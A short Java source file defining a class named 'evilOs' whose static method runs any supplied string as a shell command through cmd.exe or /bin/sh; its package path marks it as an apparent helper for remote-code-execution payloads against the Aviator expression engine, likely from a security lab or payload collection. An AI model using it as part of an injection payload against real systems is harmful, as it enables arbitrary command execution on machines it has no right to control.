package com.best.hello.newPayload.RCE.Aviator;

import java.io.IOException;

public class evilOs {
    public static Process exec(String cmd) throws IOException {
        Process p = null;
        if (System.getProperty("os.name").toLowerCase().contains("win")) {
            p = Runtime.getRuntime().exec((new String[]{"cmd.exe", "/c", cmd}));
        } else {
            p = Runtime.getRuntime().exec((new String[]{"/bin/sh", "-c", cmd}));
        }
        return p;
    }
}
